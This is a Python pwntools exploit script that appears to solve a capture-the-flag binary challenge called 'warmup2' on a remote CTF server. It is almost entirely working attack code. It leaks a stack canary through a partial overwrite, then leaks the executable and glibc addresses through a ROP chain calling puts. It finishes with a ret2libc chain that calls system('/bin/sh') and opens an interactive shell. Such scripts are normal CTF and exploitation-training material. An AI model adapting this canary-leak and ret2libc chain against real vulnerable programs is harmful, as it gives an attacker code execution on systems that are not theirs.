from pwn import *

# Partial RIP overwrite to return to win()
payload = b'a'*(272-16) +b'b'*6 + b'Ec' +b'a'

p = remote("warmup2.ctf.maplebacon.org",1337)
#p = process("./chal")
p.recvline()
p.send(payload)
rec = (p.recvline())
print("Recieved: ",rec)

leakstr = rec[rec.find(b'Eca')+3:]
canary = b'\x00' + leakstr[:7]

print("Leak string: ",leakstr)

print("Leaked stack canary: ",canary, len(canary))
p.recvline()

# Partial RIP overwrite
payload_2 = b'a'*(272-16) +b'b'*8 + canary + b'a'*8  + b'\xdd'
p.send(payload_2)

p.recvline()
p.recvline()

payload_3 = b'a'*(272) +b'b'*6 + b'Ec'
p.send(payload_3)
exec_leak = p.recvline()
print(exec_leak)
exec_leak = exec_leak[exec_leak.find(b'Ec')+2:][:6] 
exec_addr = u64(exec_leak + (b'\x00'*(8-len(exec_leak))))


offset = 0x00000000000012e2

base_addr = exec_addr - offset
vuln_fun = p64(base_addr+0x00000000000011e9)
vuln_call = p64(base_addr + 0x00000000000012dd)

pop_rdi = p64(base_addr+ 0x0000000000001353)

puts_plt = p64(base_addr+0x00000000000010a0)
puts_got = p64(base_addr+0x3fa8)
printf_got = p64(base_addr+0x3fc0)
read_got = p64(base_addr+0x3fd0)
ret = p64(base_addr+0x000000000000101a)
print("Executable leak:",hex(exec_addr))

p.recvline()
payload_4 =  b'a'*(272-16) +b'b'*8 + canary + b'a'*8  + pop_rdi + puts_got + puts_plt + ret+vuln_call 
p.send(payload_4)
#print("MSG: ",p.recvline())
p.recvline()
puts_leak = p.recvline()[:-1]
print("PUTS: ",puts_leak)
puts_addr = u64(puts_leak+b'\x00'*(8-len(puts_leak)))

print("puts() glibc leak: ",hex(puts_addr))

puts_offset = 0x84420
system_offset = 0x52290
binsh_offset= 0x1b45bd

base_glibc_addr = puts_addr - puts_offset
print("Base glibc address: ",hex(base_glibc_addr))

system = p64(base_glibc_addr+system_offset)
binsh = p64(base_glibc_addr+binsh_offset)

print("BINSH addr: ",hex(base_glibc_addr+binsh_offset))
print("system addr: ",hex(base_glibc_addr+system_offset))

final_4 =  b'A'*(272-16) +b'b'*8 + canary + b'a'*8 + ret + pop_rdi + binsh + system
#final_4 =  b'a'*(272-16) +b'b'*8 + canary + b'a'*8  + pop_rdi + puts_got + puts_plt + ret+vuln_call 

p.recvline()
p.send(final_4)
p.recvline()
p.send(final_4)
p.recvline()

p.interactive()
